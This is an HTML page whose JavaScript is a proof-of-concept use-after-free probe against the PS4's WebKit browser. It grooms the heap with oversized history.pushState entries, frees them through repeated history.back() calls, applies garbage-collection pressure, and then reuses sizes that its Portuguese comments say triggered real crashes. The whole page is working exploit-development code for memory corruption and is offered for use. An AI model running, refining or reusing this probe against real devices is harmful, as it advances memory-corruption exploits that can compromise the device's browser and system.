<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit – Step 7 Exploitability Probe</title>
<style>
body { font-family: monospace; background: #000; color: #0f0; }
button { font-size: 16px; padding: 10px; }
#log { white-space: pre-wrap; margin-top: 10px; }
</style>
</head>

<body>
<h2>PS4 WebKit – Step 7 (History Reuse / UAF Probe)</h2>
<button onclick="run()">RUN STEP 7</button>
<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m) {
    logEl.textContent += m + "\n";
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function run() {
    log("[*] STEP 7 START");

    const BASE = 977;
    const STEP = 14461; // boundary confirmado por você
    let size = BASE;

    try {
        // -----------------------------
        // FASE 1 – Heap grooming
        // -----------------------------
        log("[1] Grooming history (safe phase)");
        for (let i = 0; i < 30; i++) {
            const payload = "A".repeat(size);
            history.pushState({}, "", "#groom_" + payload);
            size += STEP;
        }
        log("[1] Grooming done");

        // -----------------------------
        // FASE 2 – Destruição controlada
        // -----------------------------
        log("[2] History destruction (sync + async back)");
        for (let i = 0; i < 10; i++) {
            history.back();
        }

        await sleep(50);

        for (let i = 0; i < 5; i++) {
            setTimeout(() => history.back(), 0);
        }

        log("[2] Back operations scheduled");

        // -----------------------------
        // FASE 3 – Heap pressure externa
        // -----------------------------
        log("[3] External heap pressure");
        let trash = [];
        for (let i = 0; i < 200; i++) {
            trash.push(new Array(10000).fill("X" + i));
        }
        trash = null;
        log("[3] Heap pressure released");

        await sleep(100);

        // -----------------------------
        // FASE 4 – Reuso crítico
        // -----------------------------
        log("[4] Critical reuse phase (EXPECTED CRASH ZONE)");

        size = BASE + STEP * 44; // região onde você observou crash real
        for (let i = 0; i < 10; i++) {
            log(`[ITER ${i}] size=${size}`);
            const payload = "B".repeat(size);

            log(" pushState()");
            history.pushState({}, "", "#reuse_" + payload);

            log(" replaceState()");
            history.replaceState({}, "", "#reuse2_" + payload.slice(0, payload.length / 2));

            size += STEP;
        }

        log("[*] STEP 7 FINISHED WITHOUT CRASH (interesting)");

    } catch (e) {
        log("[!] JS Exception: " + e);
    }
}

log("Ready.");
</script>
</body>
</html>

